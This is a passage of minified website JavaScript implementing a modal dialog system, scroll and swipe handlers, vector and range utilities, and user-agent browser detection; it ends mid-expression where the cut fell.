this.cachedDelgateClickHandler_||(this.cachedDelgateClickHandler_=(t,e)=>this.delegateClickHandler_(t,e)),this.cachedDelgateClickHandler_}getOnHistoryChangeListener_(){return this.historyChangeListener_||(this.historyChangeListener_=t=>this.onHistoryChange_(t)),this.historyChangeListener_}handleClickToOpenModal_(t,e){let i=this.getElementModalId_(t);!i||(e.preventDefault(),this.setActive(!0,i))}handleClickToCloseModal_(t){this.isElementCloseButton_(t)&&this.setActive(!1)}getActiveId_(){return this.contentContainerEl.getAttribute(this.attributes_.ACTIVE_ID)}isElementCloseButton_(t){return t.classList.contains(this.cssClasses_.CLOSE)||t.hasAttribute(this.attributes_.CLOSE)}getElementModalId_(t){return t.getAttribute(this.attributes_.ID)}initStateFromHash_(){let t=gn.getIdFromHash_();this.isValidModalId_(t)&&this.setActive(!0,t,!1)}isValidModalId_(t){let e=document.querySelectorAll(`[${this.attributes_.BASE}]`);return Array.from(e).some((e=>e.getAttribute(this.attributes_.BASE)==t))}initDom_(){this.modalElement_=this.buildModalElement_(),this.closeEl_=this.buildCloseButton_(),document.documentElement.appendChild(this.closeEl_),this.modalElement_.appendChild(this.buildMaskElement_()),this.contentContainerEl=this.buildContentContainerElement_(),this.modalElement_.appendChild(this.contentContainerEl),document.body.appendChild(this.modalElement_)}buildContentContainerElement_(){return ac("div",this.cssClasses_.CONTENT)}buildMaskElement_(){return ac("div",this.cssClasses_.MASK)}buildModalElement_(){return ac("div",this.cssClasses_.BASE)}buildCloseButton_(){let t=ac("div",this.cssClasses_.CLOSE);return t.setAttribute("aria-label","Close"),t.setAttribute("role","button"),t.setAttribute("tabindex","0"),t}toggleEnterExitClasses_(t,e){let i=this.cssClasses_.ENTER_MODIFIED,r=this.cssClasses_.EXIT_MODIFIED;window.setTimeout((()=>{e?(t.classList.remove(r),t.classList.add(i)):(t.classList.remove(i),t.classList.add(r))}),0)}setVisible(t){var e=t=>{27==t.keyCode&&(this.setActive(!1),document.body.removeEventListener("keydown",e))};t?document.body.addEventListener("keydown",e):document.body.removeEventListener("keydown",e),this.toggleEnterExitClasses_(this.modalElement_,t);let i=window.setTimeout((()=>{Sf.default.enable(this.modalElement_,this.cssClasses_.ENABLED_MODIFIED,t)}),t?0:this.config.transitionDuration);this.timers_.push(i);let r=window.setTimeout((()=>{Sf.default.enable(this.modalElement_,this.cssClasses_.VISIBLE_MODIFIED,t)}),t?this.config.visibilityDuration||this.config.transitionDuration:0);this.timers_.push(r)}setActive(t,e,i){t?this.openModal(e,i):this.closeModal(i)}prepForModalStateChange_(){this.clearTimers_()}openModal(t,e){this.prepForModalStateChange_();let i=this.attributes_.ACTIVE_ID;if(this.returnContentToOrigin_(),this.contentContainerEl.firstChild){let t=this.getActiveId_();this.contentContainerEl.removeAttribute(this.attributes_.ACTIVE_ID);let e=document.querySelector(`[${this.attributes_.BASE}="${t}"]`);e&&e.appendChild(this.contentContainerEl.firstChild)}let r=document.querySelector(`[${this.attributes_.BASE}="${t}"]`).querySelector("div");this.contentContainerEl.setAttribute(i,t),r&&this.contentContainerEl.appendChild(r),this.config.onModalOpen(t,this),this.setVisible(!0)}closeModal(t){this.prepForModalStateChange_(),this.config.onModalClose(this.getActiveId_(),this),this.setVisible(!1)}returnContentToOrigin_(){if(!this.contentContainerEl)return;let t=this.getActiveId_();this.contentContainerEl.removeAttribute(this.attributes_.ACTIVE_ID);let e=document.querySelector(`[${this.attributes_.BASE}="${t}"]`),i=this.contentContainerEl.querySelector("div");e&&i&&e.appendChild(i)}clearTimers_(){this.timers_.forEach((t=>window.clearTimeout(t))),this.timers_=[]}onHistoryChange_(t){let e=gn.getIdFromHash_(),i=t.state&&t.state.akModalId;!i&&this.isValidModalId_(e)&&(i=e),this.setActive(Boolean(i),i,!1)}static getIdFromHash_(){return window.location.hash.substr(1).split("#")[0]}dispose(){Af.default.removeDelegatedListener(document,"click",this.getDelegateClickHandler_()),this.returnContentToOrigin_(),document.documentElement.removeChild(this.closeEl_),this.modalElement_.classList.remove(this.cssClasses_.ENTER_MODIFIED),this.modalElement_.classList.remove(this.cssClasses_.ENABLED_MODIFIED),this.modalElement_.classList.remove(this.cssClasses_.EXIT_MODIFIED),this.config.onModalDispose(this.getActiveId_(),this),document.body.removeChild(this.modalElement_)}},Hy=class{constructor(){this.modalInstance=null}isInitialized_(){return!!this.modalInstance}init(t){if(this.isInitialized_())return;let e=Cf.default.clone(BM);t&&Cf.default.merge(e,t),this.modalInstance=new gn(e)}openById(t){this.isInitialized_()&&this.modalInstance.setActive(!0,t,!0)}close(){this.isInitialized_()&&this.modalInstance.setActive(!1,null,!0)}dispose(){this.isInitialized_()&&(this.modalInstance.dispose(),this.modalInstance=null)}},Gy=new Hy,Rb=ye(en()),xb=class{constructor(t,e){this.rootEl=e||window,this.scrollCallback=t,this.scrollListener=null}start(t,e=!0){this.stop(),t&&this.scrollCallback&&this.scrollCallback();let i=t=>{this.scrollCallback(t,(()=>{this.stop()}))};this.rootEl.addEventListener("scroll",i,{passive:e}),this.scrollListener=()=>{this.rootEl.removeEventListener("scroll",i)}}stop(){this.scrollListener&&this.scrollListener()}dispose(){this.stop()}},Ib=xb,Pb=class{constructor(t,e){this.el=t,this.swipeCallback=e,this.disposer=null,this.touchStartX=null,this.touchStartY=null,this.touchEndX=null,this.touchEndY=null}start(){this.stop();let t=t=>{this.touchStartY=t.changedTouches[0].screenY};this.el.addEventListener("touchstart",t,{passive:!0});let e=t=>{this.touchEndX=t.changedTouches[0].screenX,this.touchEndY=t.changedTouches[0].screenY;let e=null;this.touchEndX<this.touchStartX&&(e="left"),this.touchEndX>this.touchEndY&&(e="right"),this.touchEndY<this.touchStartY&&(e="down"),this.touchEndY>this.touchStartY&&(e="up"),this.touchEndY==this.touchStartY&&(e="tap"),this.swipeCallback(t,e,(()=>{this.stop()}))};this.el.addEventListener("touchend",e,{passive:!0}),this.disposer=()=>{this.el.removeEventListener("touchstart",t,{passive:!0}),this.el.removeEventListener("touchend",e,{passive:!0})}}stop(){this.disposer&&this.disposer()}dispose(){this.stop()}},Ob=Pb,xr={OVERFLOW_HIDDEN:"no-overflow",AK_MODAL_OPEN:"ak-modal-open",AK_MODAL_CLOSE:"ak-modal-close",AK_MODAL_HIDE_CONTENT:"ak-modal-hide-content",AK_MODAL_SHOW_CLOSE_BUTTON:"ak-modal-show-close-button",AK_YOUTUBE_MODAL:"ak-youtubemodal"},wd=800,Mb=class{constructor(){this.modal_=null,this.modalOpen=!1}createAirkitModal(){let t=window.angular;null===this.modal_&&(this.modal_=Gy,this.modal_.init({onModalOpen:(e,i)=>{if(e.startsWith("wombat"))return this.wombatCurrentY=document.scrollingElement.scrollTop,i.modalElement_.classList.add(te.mqnCssName("mqn2-wombat-modal")),window.setTimeout((()=>{document.documentElement.classList.add(xr.OVERFLOW_HIDDEN)})),document.documentElement.classList.add(xr.AK_MODAL_SHOW_CLOSE_BUTTON),void(i.modalElement_.scrollTop=0);i.modalElement_.classList.remove(te.mqnCssName("mqn2-wombat-modal")),document.documentElement.classList.remove(xr.OVERFLOW_HIDDEN);let r=i.contentContainerEl,n=document.documentElement.scrollTop||document.body.scrollTop,s=document.documentElement.clientHeight;(document.querySelector(".body-part.main-body")||document.querySelector("[mqn2-app]")).style.transformOrigin=`50% ${n+s/2}px`;let o=r.querySelector("[mqn-modal-root]"),a=t.element(o).scope().$root,l=r.parentElement;o.querySelector(`.${te.mqnCssName("mqn2-frame")}`).querySelectorAll(`.${te.mqnCssName("mqn2-background-image")}`).forEach((t=>{t.classList.add(te.mqnCssName("mqn2-background-image--modal")),window.setTimeout((()=>{t.classList.add(te.mqnCssName("mqn2-background-image--modal-open"))}))}));let h=o.getAttribute("mqn-modal-document-class");this.modalOpen||(this.currentY=document.scrollingElement.scrollTop),t.element(o).scope().modalCtrl.init(this),a.$broadcast("MQN2_PARALLAX_STOP"),eo.disableScroll(),document.body.style.width=document.body.clientWidth+"px",document.body.style.overflow="hidden",document.body.style.marginTop=-this.currentY+"px",window.scroll(0,0),l.style.marginTop=this.currentY+"px",document.body.classList.add(xr.AK_MODAL_OPEN),h&&document.documentElement.classList.add(h),this.raf=new bd.default((()=>{a.$broadcast("MQN2_PARALLAX_CALCULATE"),a.$broadcast("MQN2_PARALLAX_UPDATE")})),window.setTimeout((()=>{this.raf.start()})),window.setTimeout((()=>{this.raf.stop(),eo.enableScroll(),document.body.style.marginTop="",document.body.style.width="",l.style.marginTop="",document.body.style.overflow="",document.body.style.height=r.scrollHeight+"px",a.$broadcast("MQN2_PARALLAX_START"),a.$broadcast("MQN2_INVIEW_UPDATE"),document.documentElement.classList.add(xr.AK_MODAL_SHOW_CLOSE_BUTTON);let t=t=>{window.clearTimeout(this.resizeDebouncer),this.resizeDebouncer=window.setTimeout((()=>{document.body.style.height=r.scrollHeight+"px"}),300)};window.MQN_RESIZER.addListener(t),this.windowResizeListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(t)},this.deregisterModalResizeListener_=a.$on("MQN2_MODAL_RESIZED",(()=>document.body.style.height=r.scrollHeight+"px")),this.modalOpen=!0,this.setupClickToClose_(i,r)}),wd)},onModalClose:(e,i)=>{if(e.startsWith("wombat"))return document.documentElement.classList.remove(xr.AK_MODAL_SHOW_CLOSE_BUTTON),i.modalElement_.classList.remove(te.mqnCssName("mqn2-wombat-modal")),document.documentElement.classList.remove(xr.OVERFLOW_HIDDEN),void window.setTimeout((()=>{window.scrollTo(0,this.wombatCurrentY)}));this.modalOpen=!1,this.deregisterModalResizeListener_&&this.deregisterModalResizeListener_(),this.scroll&&this.scroll.stop(),this.swiper&&this.swiper.stop();let r=i.contentContainerEl,n=r.querySelector("[mqn-modal-root]");if(!t.element(n).scope())return;let s=t.element(n).scope().modalCtrl,o=r.parentElement,a=t.element(n).scope().$root,l=n.querySelector(`.${te.mqnCssName("mqn2-background-image--modal-open")}`);l&&l.classList.add(te.mqnCssName("mqn2-background-image--modal-close")),l&&l.classList.remove(te.mqnCssName("mqn2-background-image--modal-open"));let h=n.getAttribute("mqn-modal-product"),c=n.getAttribute("mqn-modal-module"),u=n.getAttribute("mqn-autotrack-modal-close-event-label")||(this.closedViaClickToClose?"click to close":"click x"),d=n.getAttribute("mqn-autotrack-modal-close-event-category")||"modal exit",p={event:n.getAttribute("mqn-autotrack-modal-close-event")||"modal overlay",eventCategory:d,eventAction:c,eventLabel:u,pageName:window.location.pathname,pageType:"modal",product:h,moduleName:c,moduleType:"modal",nonInteraction:"0"};Rb.default.trackDataLayer(p);let m=document.scrollingElement.scrollTop;window.scrollTo(0,m),eo.disableScroll(),window.setTimeout((()=>{eo.enableScroll()}),wd),this.raf=new bd.default((()=>{a.$broadcast("MQN2_PARALLAX_CALCULATE"),a.$broadcast("MQN2_PARALLAX_UPDATE")})),window.setTimeout((()=>{document.documentElement.classList.remove(xr.AK_MODAL_SHOW_CLOSE_BUTTON),document.body.style.height="",document.body.classList.remove(xr.AK_MODAL_HIDE_CONTENT),document.body.style.width=document.body.clientWidth+"px",o.style.top=-m+"px",document.body.classList.remove(xr.AK_MODAL_OPEN),document.body.classList.add(xr.AK_MODAL_CLOSE),o.style.marginTop=this.currentY+"px",window.scroll(0,this.currentY),s&&s.closeImminent(this),a.$broadcast("MQN2_PARALLAX_CALCULATE"),a.$broadcast("MQN2_PARALLAX_UPDATE"),this.raf.start()})),window.setTimeout((()=>{s.close(this);let t=new Event("MQN2_MODAL_CLOSE");document.dispatchEvent(t);let e=r.querySelector("[mqn-modal-root]").getAttribute("mqn-modal-document-class");e&&document.documentElement.classList.remove(e),document.body.classList.remove(xr.AK_MODAL_CLOSE),document.body.style.width="",document.body.style.marginTop="",o.style.top="",this.raf.stop(),window.dispatchEvent(new Event("resize")),window.setTimeout((()=>{window.clearTimeout(this.resizeDebouncer)})),this.windowResizeListener&&this.windowResizeListener()}),wd+300)},onModalDispose:(t,e)=>{this.deregisterModalResizeListener_&&this.deregisterModalResizeListener_(),document.body.classList.remove(xr.AK_MODAL_OPEN),document.body.classList.remove(xr.AK_MODAL_CLOSE),document.body.classList.remove(xr.AK_MODAL_HIDE_CONTENT),document.documentElement.classList.remove(xr.OVERFLOW_HIDDEN),document.documentElement.classList.remove(xr.AK_MODAL_SHOW_CLOSE_BUTTON),document.body.style.height="",document.body.style.width="",document.body.style.marginTop="";let i=e.contentContainerEl,r=i.querySelector("[mqn-modal-root]");i.parentElement.style.top="",r&&i.removeChild(r)}}))}destroyAirkitModal(){this.modal_.dispose()}setupClickToClose_(t,e){this.closedViaClickToClose=!1;let i=e.querySelector("[mqn-click-to-close]");i&&i.addEventListener("click",(()=>{this.closedViaClickToClose=!0,t.setActive(!1,null,!0)}),{once:!0})}setupScrollToClose_(t,e){this.swiper&&this.swiper.stop(),this.swiper=null,this.scroll=new Ib(((i,r)=>{let n=window.pageYOffset||document.documentElement.scrollTop,s=e.scrollHeight,o=n+window.innerHeight>=s,a=()=>{eo.disableScroll(),this.scroll&&this.scroll.stop(),this.swiper&&this.swiper.stop(),window.jQuery(window).off("DOMMouseScroll mousewheel");let e=document.scrollingElement.scrollTop;window.scrollTo(0,e),window.setTimeout((()=>{t.setActive(!1,null,!0)}),10)};this.swiper||(this.swiper=new Ob(document.documentElement,((t,e,i)=>{"down"==e&&a()})));window.jQuery(window).off("DOMMouseScroll mousewheel"),this.swiper.stop(),o&&(window.jQuery(window).on("DOMMouseScroll mousewheel",(t=>{if(t.originalEvent.detail>0||t.originalEvent.wheelDelta<0)return a(),!1})),this.swiper.start())})),this.scroll.start()}},$b=Mb;function mi(t){return void 0!==t}var lo=function(){function t(t,e){void 0===t&&(t=[]),void 0===e&&(e=Map),this.map=new e,this.populateFromIterable(t)}return t.prototype.populateFromIterable=function(t){var e=this;t.forEach((function(t){var i=t[0],r=t[1];return e.set(i,r)}))},t.prototype.replaceInnerMap=function(t){this.map=t},Object.defineProperty(t.prototype,"size",{get:function(){return this.map.size},enumerable:!1,configurable:!0}),t.prototype.clear=function(){this.map.clear()},t.prototype.delete=function(t){return this.map.delete(t)},t.prototype.entries=function(){return this.map.entries()},t.prototype.forEach=function(t,e){var i=mi(e)?e:this;this.map.forEach(t,i)},t.prototype.get=function(t){return this.map.get(t)},t.prototype.has=function(t){return this.map.has(t)},t.prototype.keys=function(){return this.map.keys()},t.prototype.set=function(t,e){return this.map.set(t,e),this},t.prototype.values=function(){return this.map.values()},t.prototype[Symbol.iterator]=function(){return this.map[Symbol.iterator]()},t}();function co(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]}var m$=(t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)},function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}),Xe=function(t){function e(e,i,r){void 0===e&&(e=[]),void 0===i&&(i=Map),void 0===r&&(r=co);var n=t.call(this,[],i)||this;return n.defaultFunction=r,n.populateFromIterable(e),n}return m$(e,t),e.prototype.get=function(e){return this.has(e)||this.set(e,this.defaultFunction(e)),t.prototype.get.call(this,e)},e.usingFunction=function(t){return new this([],Map,t)},e}(lo),t,Ae=function(){function t(t,e){this.min_=t,this.max_=e}return t.fromUnorderedValues=function(e,i){return new t(Math.min(e,i),Math.max(e,i))},t.clamp=function(t,e,i){return Math.min(i,Math.max(e,t))},t.prototype.clamp=function(t){return Math.min(this.max_,Math.max(this.min_,t))},t.prototype.contains=function(t){return this.min_<=t&&t<=this.max_},t.prototype.adjust=function(e){return new t(this.min_+e,this.max_+e)},t.prototype.add=function(t){return this.adjust(t)},t.prototype.subtract=function(t){return this.adjust(-t)},t.prototype.expand=function(e){return new t(this.min_-e,this.max_+e)},t.prototype.collapse=function(t){return this.expand(-t)},t.prototype.getMin=function(){return this.min_},t.prototype.getMax=function(){return this.max_},t.prototype.getDistance=function(){return this.max_-this.min_},Object.defineProperty(t.prototype,"min",{get:function(){return console.warn("WARNING: Please use getMin() and getMax() in place of getter properties min and max"),this.min_},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"max",{get:function(){return console.warn("WARNING: Please use getMin() and getMax() in place of getter properties min and max"),this.max_},enumerable:!1,configurable:!0}),t.prototype.getValueAsPercent=function(e,i){void 0===i&&(i=!0);var r=(e-this.min_)/(this.max_-this.min_);return i?new t(0,1).clamp(r):r},t.prototype.getPercentAsValue=function(e,i){void 0===i&&(i=!0);var r=i?new t(0,1).clamp(e):e;return this.min_+(this.max_-this.min_)*r},t.prototype.getPercentAsInt=function(t){return Math.round(this.getPercentAsValue(t))},t.prototype.getOverlap=function(e){return this.hasOverlap(e)?new t(Math.max(this.min_,e.getMin()),Math.min(this.max_,e.getMax())):null},t.prototype.hasOverlap=function(t){return this.max_>=t.getMin()&&t.getMax()>=this.min_},t.fromRangeInput=function(e){return new t(parseFloat(e.min),parseFloat(e.max))},t.prototype.shiftToZeroMin=function(){return new t(0,this.getMax()-this.getMin())},t}();function Da(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t.slice(1).every((function(e){return t[0]===e}))}function uo(t){return!!t}function Vt(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];for(var i=[],r=0,n=t.filter((function(t){return t.length>r}));n.length;)i[r]=n.map((function(t){return t[r]})),r++,n=n.filter((function(t){return t.length>r}));return i}function $c(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!(!t.every((function(t){return uo(t)}))||!Da.apply(void 0,t.map((function(t){return t.length}))))&&Vt.apply(void 0,t).every((function(t){return Da.apply(void 0,t)}))}function Hr(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t.reduce((function(t,e){return t+e}),0)}var wn=Math.sign?Math.sign:function(t){return(t>0)-(t<0)||+t},Nr=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Wn=function(){function t(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.values=t}return t.add=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t.map((function(t){return t.getValues()})),r=Vt.apply(void 0,i).map((function(t){return Hr.apply(void 0,t)}));return new(this.bind.apply(this,Nr([void 0],r)))},t.prototype.alignTo=function(t){var e,i=Vt(this.getValues(),t.getValues()).map((function(t){var e=t[0],i=t[1];return Math.abs(e)*wn(i)}));return new((e=this.constructor).bind.apply(e,Nr([void 0],i)))},t.prototype.add=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return(t=this.constructor).add.apply(t,Nr([this],e))},t.invert=function(t){return t.invert()},t.prototype.invert=function(){var t;return new((t=this.constructor).bind.apply(t,Nr([void 0],this.getValues().map((function(t){return-t})))))},t.clamp=function(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];var r=Vt(t.getValues(),e),n=r.map((function(t){var e=t[0],i=t[1];return i?i.clamp(e):e}));return new(this.bind.apply(this,Nr([void 0],n)))},t.prototype.clamp=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return(t=this.constructor).clamp.apply(t,Nr([this],e))},t.subtract=function(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];return this.add.apply(this,Nr([t],e.map((function(t){return t.invert()}))))},t.prototype.subtract=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return(t=this.constructor).subtract.apply(t,Nr([this],e))},t.prototype.getValues=function(){return this.values},t.sumDeltas=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return this.subtract(t[0],t.slice(-1)[0])},t.getDeltas=function(){for(var t=this,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];var r=e[0];return e.slice(1).map((function(e){var i=t.subtract(e,r);return r=e,i}))},t.fromVector=function(t){return new(this.bind.apply(this,Nr([void 0],t.getValues())))},t.scale=function(t,e){return new(this.bind.apply(this,Nr([void 0],t.getValues().map((function(t){return t*e})))))},t.prototype.scale=function(t){return this.constructor.scale(this,t)},t.areEqual=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return $c.apply(void 0,t.map((function(t){return t.getValues()})))},t.prototype.equals=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];return(t=this.constructor).areEqual.apply(t,Nr([this],e))},t.prototype.getLength=function(){return Math.sqrt(Hr.apply(void 0,this.getValues().map((function(t){return Math.pow(t,2)}))))},t.prototype.setLength=function(t){var e=t/this.getLength();return this.scale(e)},t.prototype.clampLength=function(t){return this.getLength()>t?this.setLength(t):this},t.prototype.multiply=function(t){var e;return new((e=this.constructor).bind.apply(e,Nr([void 0],Vt(this.getValues(),t.getValues()).map((function(t){return t[0]*t[1]})))))},t.prototype.divide=function(t){var e;return new((e=this.constructor).bind.apply(e,Nr([void 0],Vt(this.getValues(),t.getValues()).map((function(t){return t[0]/t[1]})))))},t.prototype.toExponent=function(t){var e;return new((e=this.constructor).bind.apply(e,Nr([void 0],this.getValues().map((function(e){return Math.pow(e,t)})))))},t.prototype.asRanges=function(){return this.getValues().map((function(t){return new Ae(Math.min(0,t),Math.max(0,t))}))},t.toNthPower=function(t,e){return new(this.bind.apply(this,Nr([void 0],t.getValues().map((function(t){return Math.pow(t,e)})))))},t.prototype.toNthPower=function(t){return this.constructor.toNthPower(this,t)},t}(),er=document.scrollingElement||document.documentElement,gi=document.children[0],g$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),v$=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},sr=function(t){function e(e,i){void 0===e&&(e=0),void 0===i&&(i=0);for(var r=[],n=2;n<arguments.length;n++)r[n-2]=arguments[n];return t.apply(this,v$([e,i],r))||this}return g$(e,t),Object.defineProperty(e.prototype,"width",{get:function(){return this.getValues()[0]},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"height",{get:function(){return this.getValues()[1]},enumerable:!1,configurable:!0}),e.prototype.sizeElement=function(t){t.style.width=this.width+"px",t.style.height=this.height+"px"},e.fromCanvas=function(t){return void 0===t&&(t=null),new this(t.width,t.height)},e.fromVideo=function(t){return void 0===t&&(t=null),new this(t.videoWidth,t.videoHeight)},e.fromElementOffset=function(t){return void 0===t&&(t=null),t?new this(t.offsetWidth,t.offsetHeight):this.fromInnerWindow()},e.fromRootElement=function(){return new this(gi.clientWidth,gi.clientHeight)},e.fromScrollElementClient=function(){return new this(er.clientWidth,er.clientHeight)},e.fromInnerWindow=function(){return new this(window.innerWidth,window.innerHeight)},e.prototype.getArea=function(){return this.width*this.height},e.prototype.equals=function(t){return $c(this.getValues(),t.getValues())},e}(Wn);function ho(t,e){return-1!==t.indexOf(e)}var vi=window.navigator.userAgent,Lb=function(){function t(t,e){this.iterator=t,this.mapFunction=e}return t.prototype.next=function(){var t=this.iterator.next();return{done:t.done,value:this.mapFunction(t.value)}},t.prototype[Symbol.iterator]=function(){return this},t}(),y$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),_$=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Di=function(t){function e(e,i){void 0===e&&(e=[]),void 0===i&&(i=Map);var r=t.call(this,[],i)||this;return r.uid_=0,r.valueToUid_=Xe.usingFunction((function(t){return r.uid_++})),r.internalKeyToArray_=new Map,r.populateFromIterable(e),r}return y$(e,t),e.prototype.clear=function(){t.prototype.clear.call(this),this.uid_=0,this.valueToUid_.clear()},e.prototype.getInternalKey_=function(t){var e=this,i=t.map((function(t){return e.valueToUid_.get(t)})).join("-");return this.internalKeyToArray_.has(i)||this.internalKeyToArray_.set(i,t.slice()),this.internalKeyToArray_.get(i)},e.prototype.get=function(e){return t.prototype.get.call(this,this.getInternalKey_(e))},e.prototype.delete=function(e){return t.prototype.delete.call(this,this.getInternalKey_(e))},e.prototype.has=function(e){return t.prototype.has.call(this,this.getInternalKey_(e))},e.prototype.keys=function(){return new Lb(t.prototype.keys.call(this),(function(t){return t?_$(t):[]}))},e.prototype.set=function(e,i){return t.prototype.set.call(this,this.getInternalKey_(e),i)},e}(lo);function Db(t,e){for(var i=[],r=t.next();!r.done;)i.push(e(r.value)),r=t.next();return i}function Vr(t,e){for(var i=t.next();!i.done;)e(i.value),i=t.next()}function Lc(t){var e=t.constructor,i=t.entries(),r=new e;return Vr(i,(function(t){var e=t[0],i=t[1];return r.set(i,e)})),r}var b$=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Gr=function(){function t(){}return t.getAsCSSModifier=function(){return this.name_.toLowerCase().replace(/\s/,"-")},t.getName=function(){return this.name_},t.getUaids_=function(){return this.uaidsWithOffsets_.map((function(t){var e=t[0];t[1];return e}))},t.isCurrentBrowser=function(){return this.getUaids_().some((function(t){return ho(vi,t)}))},t.getVersion=function(){var t=this.uaidsWithOffsets_.find((function(t){var e=t[0];t[1];return ho(vi,e)})),e=(t[0],t[1].find((function(t){return ho(vi,t[0])}))),i=e[0],r=e[1],n=vi.indexOf(i)+r,s=vi.substring(n).split(";")[0].split(" ")[0].split(")")[0];return parseFloat(s)},t.getMajorVersion=function(){return Math.floor(this.getVersion())},t.getSupportedStyleValue=function(t,e){var i=this.genericStyleValueToSupported_.get([t,e]);return mi(i)?i:e},t.getGenericStyleValue=function(t,e){var i=this.getSupportedStyleValueToGenericMap_().get([t,e]);return mi(i)?i:e},t.getSupportedStyleProperty=function(t){var e=this.genericStylePropertyToSupported_.get(t);return mi(e)?e:t},t.getGenericStyleProperty=function(t){var e=this.getSupportedStylePropertyToGenericMap_().get(t);return mi(e)?e:t},t.getSupportedStyleValueToGenericMap_=function(){return this.supportedStyleValueToGeneric_||(this.supportedStyleValueToGeneric_=new Di(b$(Db(this.genericStyleValueToSupported_.entries(),(function(t){var e=t[0],i=e[0],r=e[1];return[[i,t[1]],r]}))))),this.supportedStyleValueToGeneric_},t.getSupportedStylePropertyToGenericMap_=function(){return this.supportedStylePropertyToGeneric_||(this.supportedStylePropertyToGeneric_=Lc(this.genericStylePropertyToSupported_)),this.supportedStylePropertyToGeneric_},t.genericStylePropertyToSupported_=new Map,t.genericStyleValueToSupported_=new Di,t}(),w$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),ki=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return w$(e,t),e.getVersion=function(){return parseFloat(vi.split("Firefox/")[1].split(" ")[0])},e.name_="Firefox",e.uaidsWithOffsets_=[["Firefox",[["Firefox",8]]]],e}(Gr),E$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Un=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return E$(e,t),e.name_="Safari",e.uaidsWithOffsets_=[["Safari",[["Version",8],["Safari",7]]]],e.genericStyleValueToSupported_=new Di([[["position","sticky"],"-webkit-sticky"]]),e}(Gr),S$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),kb=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return S$(e,t),e.name_="Chrome",e.uaidsWithOffsets_=[["Chrome",[["Chrome",7]]]],e}(Gr),A$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),Dc=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return A$(e,t),e.name_="IE",e.uaidsWithOffsets_=[["MSIE",[["MSIE",5]]],["Trident/",[["rv:",3]]]],e}(Gr),C$=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof 